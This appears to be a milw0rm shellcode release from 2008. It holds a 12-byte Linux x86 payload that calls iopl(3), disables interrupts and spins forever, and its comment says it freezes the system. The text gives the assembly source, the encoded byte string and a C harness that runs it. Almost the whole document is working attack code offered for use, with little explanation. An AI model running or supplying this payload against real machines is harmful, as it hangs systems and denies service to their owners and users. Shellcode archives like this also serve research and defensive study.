/*
  :::::::-.   ...    ::::::.    :::.
   ;;,   `';, ;;     ;;;`;;;;,  `;;;
   `[[     [[[['     [[[  [[[[[. '[[
    $$,    $$$$      $$$  $$$ "Y$c$$
    888_,o8P'88    .d888  888    Y88
    MMMMP"`   "YmmMMMM""  MMM     YM

 	[ dun[at]strcpy.pl ]

 [ linux/x86 iopl(3); asm("cli"); while(1){} 12 bytes ]

 ###############################################################
   iopl(3); asm("cli"); while(1){}
   // * this code cause freezeing system
 #################################################################

 __asm__(
	"xorl %eax, %eax\n"
	"pushl $0x3\n"
	"popl %ebx\n"
	"movb $0x6e,%al\n"
	"int $0x80\n"
	"cli\n"
	"x1:\n"
	"jmp x1\n"
 );

*/


char shellcode[]="\x31\xc0\x6a\x03\x5b\xb0\x6e\xcd\x80\xfa\xeb\xfe";

int main() {

	void (*sc)();
	sc = (void *)&shellcode;
	sc();

return 0;
}

// milw0rm.com [2008-09-17]